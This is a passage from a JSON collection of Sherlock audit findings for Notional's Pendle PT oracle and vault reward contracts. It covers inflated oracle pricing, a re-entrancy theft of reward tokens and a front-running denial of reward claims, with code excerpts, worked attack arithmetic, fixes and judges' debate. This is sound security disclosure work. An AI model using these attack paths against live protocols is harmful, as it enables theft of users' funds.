worth one unit of weETH instead of one unit of PT being worth one unit of eETH, which is incorrect.\n\nOn 1 July, the price of weETH was 3590 USD, while the price of eETH was 3438 USD. This is a difference of 152 USD.\n\nAs a result, the price returned from the Notional's `PendlePTOracle` contract will be inflated.\n\n#### Additional Information\n\nThe PT weETH 27JUN2024 has already expired as of 1 July 2024.\n\nLet's verify if the PT rate is 1.0 after maturity by inspecting the rate returned from Pendle [PT Oracle](https://arbiscan.io/address/0x9a9Fa8338dd5E5B2188006f1Cd2Ef26d921650C2)'s `getPtToSyRate` function.\n\n<img width=\"318\" alt=\"image-2024070195459431 PM\" src=\"https://github.com/sherlock-audit/2024-06-leveraged-vaults-xiaoming9090/assets/102820284/630d7ca4-f9b3-433f-a44c-70c41fa65c38\">\n\nAs shown above, the PT rate at maturity is `0.9598002817` instead of `1.0`. Thus, it is incorrect to assume that the PT rate is 1.0 post-expiry.\n\n## Impact\n\nThe price returned from the Notional's `PendlePTOracle` contract will be inflated. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L113\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEnsure that the correct PT rate is used post-expiry.",
      "summary": "\nThe bug report discusses an issue with the PT rate being incorrectly assumed to be 1.0 after the expiry date. This leads to the price being inflated and allows malicious users to borrow more than the actual collateral value, resulting in stolen assets from the protocol. The bug is caused by incorrect configuration files and code assumptions. The report recommends ensuring the correct PT rate is used post-expiry. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/69",
      "tags": [],
      "finders": [
        "lemonmon",
        "xiaoming90"
      ]
    },
    {
      "id": "35122",
      "title": "H-9: Wrong decimal precision resulted in the price being inflated",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/66 \n\n## Found by \nnirohgo, xiaoming90\n## Summary\n\nThe wrong decimal precision inflated the price returned from the oracle. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.\n\n## Vulnerability Detail\n\nWhen Notional's `PendlePTOracle` is deployed, the `ptDecimals` is set to the decimals of the PT token, as shown below.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L58\n\n```solidity\nFile: PendlePTOracle.sol\n32:     constructor (\n..SNIP..\n50:         uint8 _baseDecimals = baseToUSDOracle_.decimals();\n51:         (/* */, address pt, /* */) = IPMarket(pendleMarket_).readTokens();\n52:         uint8 _ptDecimals = IERC20(pt).decimals();\n..SNIP..\n57:         baseToUSDDecimals = int256(10**_baseDecimals);\n58:         ptDecimals = int256(10**_ptDecimals);\n```\n\nThe `_getPTRate` function below will return:\n\n- If `useSyOracleRate` is true, the Pendle's `getPtToSyRate` function will be called to return how many SY tokens one unit of PT is worth\n- If `useSyOracleRate` is false,  the Pendle's `getPtToAssetRate` function will be called to return how many underlying asset tokens one unit of PT is worth\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L85\n\n```solidity\nFile: PendlePTOracle.sol\n85:     function _getPTRate() internal view returns (int256) {\n86:         uint256 ptRate = useSyOracleRate ? \n87:             Deployments.PENDLE_ORACLE.getPtToSyRate(pendleMarket, twapDuration) :\n88:             Deployments.PENDLE_ORACLE.getPtToAssetRate(pendleMarket, twapDuration);\n89:         return ptRate.toInt();\n90:     }\n```\n\nUsing PT fUSDC 26DEC2024 as an example to illustrate the issue. Note that this issue will also occur on other PTs due to wrong math.\n\nAssume that the `PendlePTOracle` provides the price of PT fUSDC 26DEC2024. For PT fUSDC 26DEC2024, the details are as follows:\n\n> [YT fUSDC 26DEC2024 (YT-fUSDC-...)](https://etherscan.io/token/0x5935cEdD7D33a32cD60e0F97cFf54A6Bbdbe7Eee) = 6 decimals\n>\n> [PT fUSDC 26DEC2024 (PT-fUSDC-...)](https://etherscan.io/token/0xd187bea2c423d908d102ebe5ee8c65d37f4085c3) = 6 decimals\n>\n> [SY fUSDC (SY-fUSDC)](https://etherscan.io/token/0xf94A3798B18140b9Bc322314bbD36BC8e245E29B) = 8 decimals\n>\n> Underlying Asset = [Flux USDC (fUSDC)](https://etherscan.io/token/0x465a5a630482f3abd6d3b84b39b29b07214d19e5) = 8 decimals\n>\n> Market = 0xcb71c2a73fd7588e1599df90b88de2316585a860\n>\n> Pendle's Market Page: https://app.pendle.finance/trade/markets/0xcb71c2a73fd7588e1599df90b88de2316585a860/swap?view=pt&chain=ethereum&py=output\n\nIn this case, the `ptDecimals` will be 1e6. The `rateDecimals` is always hardcoded to `1e18`.\n\nAssume that the `baseToUSD` provides the price of fUSDC in terms of US dollars, and `baseToUSDDecimals` is 1e8. The price returned is `99990557`, close to 1 US Dollar (USD).\n\nAssume that `useSyOracleRate` is set to `False`, the Pendle's `getPtToAssetRate` function will be called, and the price (`ptRate`) returned will be `978197897539187120`, as shown below.\n\nhttps://etherscan.io/address/0x9a9fa8338dd5e5b2188006f1cd2ef26d921650c2#readProxyContract\n\n<img width=\"325\" alt=\"image-2024070225519056 PM\" src=\"https://github.com/sherlock-audit/2024-06-leveraged-vaults-xiaoming9090/assets/102820284/93cc94d4-c54c-47d0-95ef-993a8a41e231\">\n\nThe above-returned price (`978197897539187120`) is in 18 decimals. This means 1 PT is worth around 1 fUSDC (`978197897539187120 / 1e18`), which makes sense.\n\nHowever, based on the formula at Line 117 below, the price of the PT fUSDC 26DEC2024 will be `9.781055263e29`, which is incorrect and is an extremely large number (inflated by 12 orders of magnitude). This is far from the intended price of PT fUSDC 26DEC2024, which should hover around 1 USD.\n\n```solidity\nanswer = (ptRate * baseToUSD * rateDecimals) /(baseToUSDDecimals * ptDecimals)\nanswer = (978197897539187120 * baseToUSD * rateDecimals) /(baseToUSDDecimals * 1e6)\nanswer = (978197897539187120 * 99990557 * rateDecimals) /(1e8 * 1e6)\nanswer = (978197897539187120 * 99990557 * 1e18) /(1e8 * 1e6)\nanswer = 9.781055263e29\n```\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L117\n\n```solidity\nFile: PendlePTOracle.sol\n092:     function _calculateBaseToQuote() internal view returns (\n093:         uint80 roundId,\n094:         int256 answer,\n095:         uint256 startedAt,\n096:         uint256 updatedAt,\n097:         uint80 answeredInRound\n098:     ) {\n099:         _checkSequencer();\n100: \n101:         int256 baseToUSD;\n102:         (\n103:             roundId,\n104:             baseToUSD,\n105:             startedAt,\n106:             updatedAt,\n107:             answeredInRound\n108:         ) = baseToUSDOracle.latestRoundData();\n109:         require(baseToUSD > 0, \"Chainlink Rate Error\");\n110:         // Overflow and div by zero not possible\n111:         if (invertBase) baseToUSD = (baseToUSDDecimals * baseToUSDDecimals) / baseToUSD;\n112: \n113:         // Past expiration, hardcode the PT oracle price to 1. It is no longer tradable and\n114:         // is worth 1 unit of the underlying SY at expiration.\n115:         int256 ptRate = expiry <= block.timestamp ? ptDecimals : _getPTRate();\n116: \n117:         answer = (ptRate * baseToUSD * rateDecimals) /\n118:             (baseToUSDDecimals * ptDecimals);\n119:     }\n```\n\nThe root cause is that the code wrongly assumes that the price returned from Pendle's `getPtToAssetRate` function is denominated in PT's decimals. However, it is, in fact, denominated in 18 decimals. Thus, when the PT is not 18 decimals, such as the one in our example (6 decimals), the price returned from Notional's `PendlePTOracle` will be overly inflated.\n\n## Impact\n\nThe price returned from the Notional's `PendlePTOracle` contract will be inflated. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L58\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L85\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L117\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUpdate the formula to ensure that the PT rate is divided by the rate decimals of Pendle's PT Oracle.",
      "summary": "\nThis bug report discusses an issue with the decimal precision in the Notional platform's `PendlePTOracle` contract. Due to this error, the price returned from the oracle is inflated, which can allow malicious users to borrow more assets than they actually have, potentially stealing from the protocol. The report provides details on how the incorrect decimal precision is causing the issue and includes code snippets to illustrate the problem. The impact of this bug is significant, and the report recommends updating the formula to ensure the correct decimal precision is used. The tool used to identify this bug was manual review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/66",
      "tags": [],
      "finders": [
        "xiaoming90",
        "nirohgo"
      ]
    },
    {
      "id": "35121",
      "title": "H-8: Malicious users can steal reward tokens via re-entrancy attack",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/64 \n\n## Found by \nxiaoming90\n## Summary\n\nMalicious users can steal reward tokens via re-entrancy attack.\n\n## Vulnerability Detail\n\nDuring the redemption of vault shares, the `_updateAccountRewards` function will be triggered at the end of the function to update the account rewards.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/SingleSidedLPVaultBase.sol#L282\n\n```solidity\nFile: SingleSidedLPVaultBase.sol\n282:     function _redeemFromNotional(\n283:         address account, uint256 vaultShares, uint256 /* maturity */, bytes calldata data\n284:     ) internal override virtual whenNotLocked returns (uint256 finalPrimaryBalance) {\n..SNIP..\n316:         _updateAccountRewards({\n317:             account: account,\n318:             vaultShares: vaultShares,\n319:             totalVaultSharesBefore: totalVaultSharesBefore,\n320:             isMint: false\n321:         });\n322:     }\n```\n\nAssume that at T1\n\n- Bob has 100 vault shares\n- Current `rewardsPerVaultShare` is 1.0\n- Bob's debt (`VaultStorage.getAccountRewardDebt()[rewardToken][Bob]`) is 100 (`100 shares * 1.0`)\n\nAssume that at T2:\n\n- Bob attempts to redeem 90 vault shares\n- Current `rewardsPerVaultShare` is 2.0\n\nWhen Line 211 below is executed, the `vaultSharesBefore` will be set to 100 vault shares. The `_claimAccountRewards` function will be executed in Line 212, and it will execute the `_claimRewardToken` function internally.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L211\n\n```solidity\nFile: VaultRewarderLib.sol\n202:     /// @notice Called by the vault during enter and exit vault to update the account reward claims.\n203:     function updateAccountRewards(\n204:         address account,\n205:         uint256 vaultShares,\n206:         uint256 totalVaultSharesBefore,\n207:         bool isMint\n208:     ) external {\n209:         // Can only be called via enter or exit vault\n210:         require(msg.sender == address(Deployments.NOTIONAL));\n211:         uint256 vaultSharesBefore = _getVaultSharesBefore(account);\n212:         _claimAccountRewards(\n213:             account,\n214:             totalVaultSharesBefore,\n215:             vaultSharesBefore,\n216:             isMint ? vaultSharesBefore + vaultShares : vaultSharesBefore - vaultShares\n217:         );\n218:     }\n```\n\nWithin the `_claimRewardToken` function, the `_getRewardsToClaim` function will be executed to compute the number of reward tokens that Bob is entitled to. Based on the formula within the `_getRewardsToClaim` function, Bob is entitled 100 reward tokens.\n\n```solidity\nrewardToClaim = (vaultSharesBefore * rewardsPerVaultShare) - Bob's debt\nrewardToClaim = (100 shares * 2.0) - 100 = 100\n```\n\nIn Line 306 below, Bob's debt (`VaultStorage.getAccountRewardDebt()[rewardToken][Bob]`) will be updated to 20 ( `vaultSharesAfter * rewardsPerVaultShare = 10 shares * 2.0 = 20`). Note that `vaultSharesAfter` is 10 shares because Bob withdraws 90 shares from his initial 100 shares.\n\nIn Line 316 below, 100 reward tokens will be transferred to Bob.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L316\n\n```solidity\nFile: VaultRewarderLib.sol\n295:     function _claimRewardToken(\n296:         address rewardToken,\n297:         address account,\n298:         uint256 vaultSharesBefore,\n299:         uint256 vaultSharesAfter,\n300:         uint256 rewardsPerVaultShare\n301:     ) internal returns (uint256 rewardToClaim) {\n302:         rewardToClaim = _getRewardsToClaim(\n303:             rewardToken, account, vaultSharesBefore, rewardsPerVaultShare\n304:         );\n305: \n306:         VaultStorage.getAccountRewardDebt()[rewardToken][account] = (\n307:             (vaultSharesAfter * rewardsPerVaultShare) /\n308:                 uint256(Constants.INTERNAL_TOKEN_PRECISION)\n309:         );\n310: \n311:         if (0 < rewardToClaim) {\n312:             // Ignore transfer errors here so that any strange failures here do not\n313:             // prevent normal vault operations from working. Failures may include a\n314:             // lack of balances or some sort of blacklist that prevents an account\n315:             // from receiving tokens.\n316:             try IEIP20NonStandard(rewardToken).transfer(account, rewardToClaim) {\n317:                 bool success = TokenUtils.checkReturnCode();\n318:                 if (success) {\n319:                     emit VaultRewardTransfer(rewardToken, account, rewardToClaim);\n320:                 } else {\n321:                     emit VaultRewardTransfer(rewardToken, account, 0);\n322:                 }\n323:             // Emits zero tokens transferred if the transfer fails.\n324:             } catch {\n325:                 emit VaultRewardTransfer(rewardToken, account, 0);\n326:             }\n327:         }\n```\n\nAssume that the reward token contains a hook or callback. As a result, the control will be passed back to Bob. Note that there are no restrictions on the type of reward tokens in the context of this audit.\n\nBob can re-enter the vault and execute the `claimAccountRewards` function, which is not guarded against re-entrancy. When Line 197 is executed, the `totalVaultSharesBefore` will still remain 100 vault shares because the execution `_redeemFromNotional` function has not been completed yet. Thus, the number of vault shares has not been updated on Notional side yet. The `_claimRewardToken` function, followed by `_getRewardsToClaim` will be executed again internally.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L197\n\n```solidity\nFile: VaultRewarderLib.sol\n193:     /// @notice Callable by an account to claim their own rewards, we know that the vault shares have\n194:     /// not changed in this transaction because the contract has not been called by Notional\n195:     function claimAccountRewards(address account) external override {\n196:         require(msg.sender == account);\n197:         uint256 totalVaultSharesBefore = VaultStorage.getStrategyVaultState().totalVaultSharesGlobal;\n198:         uint256 vaultSharesBefore = _getVaultSharesBefore(account);\n199:         _claimAccountRewards(account, totalVaultSharesBefore, vaultSharesBefore, vaultSharesBefore);\n200:     }\n```\n\nBased on the formula within the `_getRewardsToClaim` function, Bob is entitled 180 reward tokens.\n\n```solidity\nrewardToClaim = (vaultSharesBefore * rewardsPerVaultShare) - Bob's debt\nrewardToClaim = (100 shares * 2.0) - 20 = 180\n```\n\nThe vault will transfer an additional 180 reward tokens to Bob again, which is incorrect. In this case, Bob has stolen 180 reward tokens from the vault and other shareholders.\n\n#### Instance 2\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L110\n\n```solidity\nFile: WithdrawRequestBase.sol\n109:     function _initiateWithdraw(address account, bool isForced) internal {\n110:         uint256 vaultShares = Deployments.NOTIONAL.getVaultAccount(account, address(this)).vaultShares;\n111:         require(0 < vaultShares);\n```\n\nAttackers can also call this function. Because Line 110 will still read the outdated vault share info, it will be the higher than expected number.\n\n## Impact\n\nReward tokens can be stolen by malicious users.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/SingleSidedLPVaultBase.sol#L282\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L211\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L316\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L197\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L110\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd re-entrancy guard on the `claimAccountRewards` function to prevent anyone from re-entering the vault under any circumstance.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xmystery** commented:\n>  Devoid of coded POC to substantiate exploit\n\n\n\n**xiaoming9090**\n\nEscalate.\n\nThis issue should be a valid High.\n\nThe lead judge mentioned that the issue was \"Devoid of coded POC to substantiate exploit\" and marked it as invalid. However, the POC in the report is already sufficient to demonstrate that the vulnerability mentioned in the report could lead to a loss of assets. Thus, it should be valid.\n\n**sherlock-admin3**\n\n> Escalate.\n> \n> This issue should be a valid High.\n> \n> The lead judge mentioned that the issue was \"Devoid of coded POC to substantiate exploit\" and marked it as invalid. However, the POC in the report is already sufficient to demonstrate that the vulnerability mentioned in the report could lead to a loss of assets. Thus, it should be valid.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**mystery0x**\n\n> Escalate.\n> \n> This issue should be a valid High.\n> \n> The lead judge mentioned that the issue was \"Devoid of coded POC to substantiate exploit\" and marked it as invalid. However, the POC in the report is already sufficient to demonstrate that the vulnerability mentioned in the report could lead to a loss of assets. Thus, it should be valid.\n\nWill have the sponsors look into this finding to decide whether or not their reward tokens will have hook entailed. It seems to me the sponsors would have specified any of these weird tokens requiring non-reentrant visibility in the 2nd question of the contest readme `Details` if they had been adopted.\n\n**WangSecurity**\n\nThe protocol didn't specify which tokens will be used as rewards, so we have to assume only the standard tokens without any weird traits will be used. Hence, we should assume tokens with hooks or callbacks allowing for reentrancy won't be used. Planning to reject the escalation and leave the issue as it is.\n\n**xiaoming9090**\n\n> The protocol didn't specify which tokens will be used as rewards, so we have to assume only the standard tokens without any weird traits will be used. Hence, we should assume tokens with hooks or callbacks allowing for reentrancy won't be used. Planning to reject the escalation and leave the issue as it is.\n\n@WangSecurity The contracts are meant to handle tokens that Notional protocol will receive from other protocols or projects (e.g., grants). Thus, it is not possible for Notional to predict what kind of tokens they will receive in the future. To be on the safe side, we should assume the worst-case scenario where it might be possible that some of the reward tokens might contain hook or callback, and necessary measures should be implemented to guard against potential re-entrancy attack.\n\n@jeffywu You might want to have a look at this. Thanks.\n\n**jeffywu**\n\nI agree with @xiaoming9090's assessment, this is a valid issue. Some reward tokens may hold callback hooks that we are unaware of.\n\n**0502lian**\n\nIn my opinion, even if there is reentrancy, there won’t be any loss. If my understanding is incorrect, please correct me. \n@xiaoming9090 @jeffywu \nThank you!\n\nThe loss due to reentrancy is based on the description by @xiaoming9090 , ‘When Line 197 is executed, the totalVaultSharesBefore will still remain 100 vault shares because the execution of the _redeemFromNotional function has not been completed yet. Thus, the number of vault shares has not been updated on the Notional side yet.’\n\nHowever, after research, I found that totalVaultSharesBefore is updated first and then _redeemFromNotional() is called.\n\nhttps://github.com/notional-finance/contracts-v3/blob/b664c157051d256ce583ba19da3e26c6cf5061ac/contracts/external/actions/VaultAccountAction.sol#L215\n```javascript\nfunction exitVault(\n        address account,\n        address vault,\n        address receiver,\n        uint256 vaultSharesToRedeem,\n        uint256 lendAmount,\n        uint32 minLendRate,\n        bytes calldata exitVaultData\n    ) external payable override nonReentrant returns (uint256 underlyingToReceiver) {\n       //---------skip---------\n          //update here    \n    @>>    vaultState.exitMaturity(vaultAccount, vaultConfig, vaultSharesToRedeem);\n\n        if (vaultAccount.tempCashBalance > 0) {\n            Emitter.emitTransferPrimeCash(\n                vault, receiver, vaultConfig.borrowCurrencyId, vaultAccount.tempCashBalance\n            );\n\n            underlyingToReceiver = VaultConfiguration.transferFromNotional(\n                receiver, vaultConfig.borrowCurrencyId, vaultAccount.tempCashBalance, vaultConfig.primeRate, false\n            );\n\n            vaultAccount.tempCashBalance = 0;\n        }\n\n        // If insufficient strategy tokens are redeemed (or if it is set to zero), then\n        // redeem with debt repayment will recover the repayment from the account's wallet\n        // directly.\n         // call _redeemFromNotional() in redeemWithDebtRepayment()\n    @>>  underlyingToReceiver = underlyingToReceiver.add(vaultConfig.redeemWithDebtRepayment(\n            vaultAccount, receiver, vaultSharesToRedeem, exitVaultData\n        ));\n\n        // Set the vault state after redemption completes\n        vaultState.setVaultState(vaultConfig);\n\n       //---skip----------\n    }\n```\nupdate storage\n```javascript\nfunction exitMaturity(\n        VaultState memory vaultState,\n        VaultAccount memory vaultAccount,\n        VaultConfig memory vaultConfig,\n        uint256 vaultSharesToRedeem\n    ) internal {\n        require(vaultAccount.maturity == vaultState.maturity);\n        mapping(address => mapping(uint256 => VaultStateStorage)) storage store = LibStorage.getVaultState();\n        VaultStateStorage storage s = store[vaultConfig.vault][vaultState.maturity];\n\n        // Update the values in memory\n        vaultState.totalVaultShares = vaultState.totalVaultShares.sub(vaultSharesToRedeem);\n        vaultAccount.vaultShares = vaultAccount.vaultShares.sub(vaultSharesToRedeem);\n\n        // Update the global value in storage\n @>>       s.totalVaultShares = vaultState.totalVaultShares.toUint80();\n    }\n\n```\nredeemWithDebtRepayment  calls _redeem, then calls redeemFromNotional, then calls _redeemFromNotional\n```javascript\n/// @notice Redeems without any debt repayment and sends profits back to the receiver\n    function redeemWithDebtRepayment(\n        VaultConfig memory vaultConfig,\n        VaultAccount memory vaultAccount,\n        address receiver,\n        uint256 vaultShares,\n        bytes calldata data\n    ) internal returns (uint256 underlyingToReceiver) {\n        uint256 amountTransferred;\n        uint256 underlyingExternalToRepay;\n        {\n            //-----------skip-------------\n            (amountTransferred, underlyingToReceiver, /* primeCashRaised */) = _redeem(\n                vaultConfig,\n                underlyingToken,\n                vaultAccount.account,\n                receiver,\n                vaultShares,\n                vaultAccount.maturity,\n                underlyingExternalToRepay,\n                data\n            );\n        }\n\n      // ------skip--------\n    }\n```\n```javascript\n\nfunction _redeem(\n        VaultConfig memory vaultConfig,\n        Token memory underlyingToken,\n        address account,\n        address receiver,\n        uint256 vaultShares,\n        uint256 maturity,\n        uint256 underlyingExternalToRepay,\n        bytes calldata data\n    ) private returns (\n        uint256 amountTransferred,\n        uint256 underlyingToReceiver,\n        int256 primeCashRaised\n    ) {\n            //-----skip-----\n        {\n            uint256 balanceBefore = underlyingToken.balanceOf(address(this));\n   @>>         underlyingToReceiver = IStrategyVault(vaultConfig.vault).redeemFromNotional(\n                account, receiver, vaultShares, maturity, underlyingExternalToRepay, data\n            );\n    }\n\n//--------skip------\n```\n\nBecause all data is updated before token transfer,  There is nothing can be done in re-entrancy.\n\n**xiaoming9090**\n\nDuring the re-entrancy, Bob's vault shares should have decreased from 100 vault shares to 10 vault shares since he withdraws 90 vault shares. However, it remains at 100 vault shares. This is because vault account shares are not updated in storage until the vault complete its exit [here](https://github.com/notional-finance/contracts-v3/blob/b664c157051d256ce583ba19da3e26c6cf5061ac/contracts/external/actions/VaultAccountAction.sol#L278). Thus, the reward calculation in the re-entrancy will be incorrect.\n\nThere is a minor typo in this paragraph. Refer to the update below. Apart from that, the rest, including the math calculation, is correct.\n```diff\n- Line 197 is executed, the totalVaultSharesBefore will still remain 100 vault shares because the execution _redeemFromNotional function has not been completed yet. \n+ Line 198 is executed, the vaultSharesBefore will still remain 100 vault shares because the execution _redeemFromNotional function has not been completed yet. \n```\n\n\n\n**0502lian**\n\n\n\n\n> During the re-entrancy, Bob's vault shares should have decreased from 100 vault shares to 10 vault shares since he withdraws 90 vault shares. However, it remains at 100 vault shares. This is because vault account shares are not updated in storage until the vault complete its exit [here](https://github.com/notional-finance/contracts-v3/blob/b664c157051d256ce583ba19da3e26c6cf5061ac/contracts/external/actions/VaultAccountAction.sol#L278). Thus, the reward calculation in the re-entrancy will be incorrect.\n> \n> There is a minor typo in this paragraph. Refer to the update below. Apart from that, the rest, including the math calculation, is correct.\n> \n> ```diff\n> - Line 197 is executed, the totalVaultSharesBefore will still remain 100 vault shares because the execution _redeemFromNotional function has not been completed yet. \n> + Line 198 is executed, the vaultSharesBefore will still remain 100 vault shares because the execution _redeemFromNotional function has not been completed yet. \n> ```\n\n\nThen I think you are right.  User's vault account shares  indeed updates  after _redeemFromNotional(). If the reward token is ERC777 , it could be a re-entrancy attack.\n\n**novaman33**\n\nHow are these in scope since the answer of the question in readMe is:\n`\nIf you are integrating tokens, are you allowing only whitelisted tokens to work with the codebase or any complying with the standard? Are they assumed to have certain properties, e.g. be non-reentrant? Are there any types of [weird tokens](https://github.com/d-xo/weird-erc20) you want to integrate?\n\nEtherFi: weETH, eETH\nEthena: USDe, sUSDe\nPendle: PT tokens\nKelp: rsETH\n`\n\n**xiaoming9090**\n\n> How are these in scope since the answer of the question in readMe is: ` If you are integrating tokens, are you allowing only whitelisted tokens to work with the codebase or any complying with the standard? Are they assumed to have certain properties, e.g. be non-reentrant? Are there any types of [weird tokens](https://github.com/d-xo/weird-erc20) you want to integrate?\n> \n> EtherFi: weETH, eETH Ethena: USDe, sUSDe Pendle: PT tokens Kelp: rsETH `\n\nNote that there are two areas where ERC20 tokens will be used:\n\n1) Vault's assets\n2) Reward tokens\n\nThe above-listed tokens (weETH, USDe, sUSDe, rsETH) are the vault's asset tokens. Anyone who reviews the vault code will clearly understand it. Thus, it is understandable from the sponsor's point of view that this information refers only to the vault's asset tokens, and not the reward tokens.\n\nAs mentioned in my [earlier comments](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/64#issuecomment-2229898997), the reward-related contracts meant to handle tokens that Notional protocol will receive from other protocols or projects (e.g., grants). Thus, it is not possible for Notional to predict what kind of tokens they will receive in the future. Thus, it makes sense for the protocol not to narrow down the reward tokens accepted at this point.\n\nIn addition, in the sponsor's [earlier comment](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/64#issuecomment-2230224433), they already shared the view that some reward tokens might contain callback hooks that they are unaware of.\n\n\n\n**novaman33**\n\nThe question is regarding any strange ERC20 tokens. Their answer is a list of tokens that does include some rebasing tokens. I agree that there are two areas where ERC20 tokens are used, but I do not agree that by any means this means that all the other tokens are supported(from this answer).  Given Sherlock's hierarchy of truth, both this and #61 should be invalid, as sponsors comments in judging cannot change the scope.\n\n**WangSecurity**\n\nAbout the reward tokens. The reason why they weren't specified in the README is because they're not set by the admins of Notional. The reward tokens are the tokens that other protocols, which Notional integrates with, use to pay out the rewards/grants. Hence, I believe it's enough contextual evidence that the protocol indeed needs to work with any type of reward tokens.\n\nTherefore, I believe this issue is valid. Even though it's only possible with tokens with hooks, the report shows how the attacker gets almost 200% more shares than they should've got. Hence, I believe high severity is appropriate, planning to accept the escalation.\n\n**WangSecurity**\n\nResult:\nHigh\nUnique\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [xiaoming9090](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/64/#issuecomment-2227179096): accepted\n\n**WangSecurity**\n\n@xiaoming9090 @mystery0x @brakeless-wtp are there any duplicates?",
      "summary": "\nThis bug report discusses a vulnerability in which malicious users can steal reward tokens through a re-entrancy attack. The vulnerability is caused by a function that updates account rewards during the redemption of vault shares. The function does not properly check for re-entrancy, allowing an attacker to repeatedly claim reward tokens and receive more than they are entitled to. This can result in the theft of reward tokens from the vault and other shareholders. The vulnerability is valid and has been accepted for resolution with a high severity rating. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/64",
      "tags": [],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "35120",
      "title": "H-7: Users can deny the vault from claiming reward tokens",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/63 \n\n## Found by \nDenTonylifer, xiaoming90\n## Summary\n\nUsers can deny the vault from claiming reward tokens by front-running the `_claimVaultRewards` function.\n\n## Vulnerability Detail\n\nThe `_claimVaultRewards` function will call the `_executeClaim` function to retrieve the reward tokens from the external protocols (e.g., Convex or Aura). The reward tokens will be transferred directly to the vault contract. The vault computes the number of reward tokens claimed by taking the difference of the before and after balance.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L174\n\n```solidity\nFile: VaultRewarderLib.sol\n148:     function _claimVaultRewards(\n..SNIP..\n152:     ) internal {\n153:         uint256[] memory balancesBefore = new uint256[](state.length);\n154:         // Run a generic call against the reward pool and then do a balance\n155:         // before and after check.\n156:         for (uint256 i; i < state.length; i++) {\n157:             // Presumes that ETH will never be given out as a reward token.\n158:             balancesBefore[i] = IERC20(state[i].rewardToken).balanceOf(address(this));\n159:         }\n160: \n161:         _executeClaim(rewardPool);\n..SNIP..\n168:         for (uint256 i; i < state.length; i++) {\n169:             uint256 balanceAfter = IERC20(state[i].rewardToken).balanceOf(address(this));\n170:             _accumulateSecondaryRewardViaClaim(\n171:                 i,\n172:                 state[i],\n173:                 